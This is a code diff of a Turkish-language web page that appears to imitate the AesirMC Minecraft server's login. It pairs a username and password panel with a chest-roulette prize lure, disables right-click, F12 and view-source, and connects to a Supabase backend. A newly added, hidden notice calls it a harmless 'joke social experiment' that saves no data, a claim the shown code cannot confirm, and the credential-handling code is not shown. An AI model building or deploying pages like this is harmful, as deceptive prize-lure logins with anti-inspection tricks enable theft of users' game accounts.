@@ -17,24 +17,15 @@
             --discord-blue: #5865F2;
         }
 
-        /* ANTI-COPY & SELECTION PROTECTION */
-        * {
-            -webkit-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            -webkit-user-drag: none;
-        }
+        /* ANTI-COPY PROTECTION */
+        * { -webkit-user-select: none; -ms-user-select: none; user-select: none; -webkit-user-drag: none; }
 
         body {
             margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
             background-color: var(--bg-dark);
             background-image: url('background2.png');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: white; min-height: 100vh;
-            display: flex; flex-direction: column;
-            overflow-x: hidden;
+            background-size: cover; background-position: center; background-attachment: fixed;
+            color: white; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden;
         }
 
         /* ÜST KAZANANLAR ŞERİDİ */
@@ -49,7 +40,7 @@
 
         @keyframes ticker-move { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
 
-        /* SOL ÜST LOGO ALANI */
+        /* SOL ÜST LOGO */
         nav { padding: 20px 5%; display: flex; align-items: center; background: transparent; }
         .nav-logo-box { display: flex; align-items: center; gap: 12px; }
         .nav-logo-box img { width: 42px; height: 42px; object-fit: contain; }
@@ -59,50 +50,54 @@
         .fixed-play-container { position: fixed; bottom: 25px; left: 25px; z-index: 9999; }
         .btn-play {
             background-color: var(--accent); color: black; padding: 12px 25px;
-            border-radius: 50px; text-decoration: none; font-weight: 800;
-            display: flex; align-items: center; gap: 12px; transition: 0.3s;
-            border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border-radius: 50px; font-weight: 800; display: flex; align-items: center; gap: 12px;
+            transition: 0.3s; border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
         }
         .btn-play:hover { transform: translateY(-5px); background-color: #f1a400; }
         .custom-cursor-img { width: 22px; height: 22px; object-fit: contain; }
 
+        /* SAĞ ALT BİLGİ BUTONU */
+        .info-trigger {
+            position: fixed; bottom: 25px; right: 25px; width: 35px; height: 35px;
+            background: rgba(255,255,255,0.1); border: 1px solid var(--border);
+            border-radius: 50%; color: white; display: flex; align-items: center;
+            justify-content: center; font-weight: 800; cursor: pointer; transition: 0.3s;
+            z-index: 9999; backdrop-filter: blur(5px);
+        }
+        .info-trigger:hover { background: var(--primary); transform: scale(1.1); }
+
         /* GİRİŞ PANELİ */
         #auth-container { margin: auto; width: 100%; max-width: 420px; padding: 40px; background: var(--glass); border: 1px solid var(--border); border-radius: 32px; text-align: center; backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
         .auth-logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(0 0 15px var(--primary)); }
-        
         input { width: 100%; padding: 16px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; outline: none; }
         
         .social-store-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 25px; }
-        .dc-btn {
-            width: 48px; height: 48px; background-color: var(--discord-blue);
-            border-radius: 50%; cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4); border: none; text-decoration: none;
-        }
-        .dc-btn img { width: 26px; height: auto; }
+        .dc-btn { width: 48px; height: 48px; background-color: var(--discord-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.3s; border: none; cursor: pointer; }
         .dc-btn:hover { transform: scale(1.1); }
-
-        .store-btn {
-            background: #000; color: white; padding: 12px 30px; border-radius: 50px;
-            font-weight: 700; text-decoration: none; font-size: 15px; transition: 0.3s;
-            border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center;
-        }
+        .store-btn { background: #000; color: white; padding: 12px 30px; border-radius: 50px; font-weight: 700; text-decoration: none; font-size: 15px; transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
         .store-btn:hover { background: #111; transform: translateY(-2px); }
+
+        /* MODALLAR (BİLGİ VE KAZANMA) */
+        .custom-modal {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+            z-index: 100000; justify-content: center; align-items: center; padding: 20px;
+        }
+        .modal-card {
+            background: #0f1012; padding: 40px; border-radius: 30px;
+            border: 1px solid var(--primary); text-align: center; max-width: 450px;
+            box-shadow: 0 0 50px rgba(0, 162, 255, 0.2);
+        }
+        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
 
         /* OYUN ALANI */
         #game-container { display: none; padding: 60px; text-align: center; }
-        .main-chest { width: 220px; cursor: pointer; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); transition: 0.3s; }
-        
-        /* RULET */
+        .main-chest { width: 220px; cursor: pointer; transition: 0.3s; }
         #roulette-section { display: none; margin-top: 40px; }
         .viewport { width: 100%; max-width: 800px; height: 150px; margin: 0 auto; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 20px; position: relative; overflow: hidden; }
         .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: var(--primary); z-index: 10; box-shadow: 0 0 15px var(--primary); }
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
         .slot { min-width: 130px; display: flex; flex-direction: column; align-items: center; }
         .slot img { width: 70px; }
-
-        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-        .win-card { background: #111; padding: 50px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; }
     </style>
 </head>
 <body>
@@ -125,6 +120,8 @@
     </button>
 </div>
 
+<div class="info-trigger" onclick="toggleModal('info-modal', true)">!</div>
+
 <div id="auth-container">
     <img src="logo.png" class="auth-logo" alt="Logo">
     <h2 style="margin-bottom: 25px; margin-top: 0;">Giriş Yap</h2>
@@ -133,9 +130,9 @@
     <button class="btn-primary" style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">GİRİŞ YAP</button>
     
     <div class="social-store-row">
-        <a href="https://discord.com/invite/k8qFbQhbHX" target="_blank" class="dc-btn">
-            <img src="dc.png" alt="Discord" onerror="this.src='https://assets-global.website-files.com/6257adef93867e3734e6d48b/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png'">
-        </a>
+        <div class="dc-btn" onclick="window.open('https://discord.com/invite/k8qFbQhbHX', '_blank')">
+            <img src="dc.png" width="24" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2111/2111370.png'">
+        </div>
         <a href="https://store.aesirmc.com/aesir-points" target="_blank" class="store-btn">Mağazaya git</a>
     </div>
 </div>
@@ -152,26 +149,36 @@
     </div>
 </div>
 
-<div id="win-modal">
-    <div class="win-card">
-        <h2 style="color: var(--primary);">KAZANDIN!</h2>
-        <h1 id="win-name" style="font-size: 40px; margin: 15px 0;"></h1>
-        <img id="win-img" src="" width="150">
-        <div style="margin-top: 30px;"><button class="btn-primary" style="padding:15px 40px; background:var(--primary); border:none; border-radius:12px; color:white; cursor:pointer;" onclick="location.reload()">KAPAT</button></div>
+<div id="info-modal" class="custom-modal">
+    <div class="modal-card">
+        <h2 style="color: var(--primary); margin-top: 0;">Sistem Bilgilendirmesi</h2>
+        <p style="line-height: 1.6; color: #ccc;">Bu web sitesi tamamen bir <b>şaka amaçlı sosyal deney</b> olarak tasarlanmıştır.</p>
+        <p style="line-height: 1.6; color: #ccc;">Burada girdiğiniz hiçbir veri (kullanıcı adı, şifre vb.) kaydedilmemekte ve sunucularımıza iletilmemektedir. Sadece arayüz simülasyonunu test etmektesiniz.</p>
+        <button class="close-btn" onclick="toggleModal('info-modal', false)">ANLADIM</button>
+    </div>
+</div>
+
+<div id="win-modal" class="custom-modal">
+    <div class="modal-card">
+        <h2 style="color: var(--success);">TEBRİKLER!</h2>
+        <h1 id="win-name" style="font-size: 36px; margin: 15px 0;"></h1>
+        <img id="win-img" src="" width="120">
+        <button class="close-btn" onclick="location.reload()">KAPAT</button>
     </div>
 </div>
 
 <script>
-    // --- KORUMA SİSTEMİ (Sağ Tık ve Kaydetme Engeli) ---
+    // --- KORUMA SİSTEMİ ---
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.onkeydown = function(e) {
-        if (e.keyCode === 123) return false; // F12
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) return false; // İncele
-        if (e.ctrlKey && e.keyCode === 85) return false; // Kaynak Kod
-        if (e.ctrlKey && e.keyCode === 83) return false; // Farklı Kaydet
+        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85) || (e.ctrlKey && e.keyCode === 83)) return false;
     };
 
-    // --- SUPABASE & OYUN MANTIĞI ---
+    function toggleModal(id, show) {
+        document.getElementById(id).style.display = show ? 'flex' : 'none';
+    }
+
+    // --- SUPABASE & OYUN ---
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
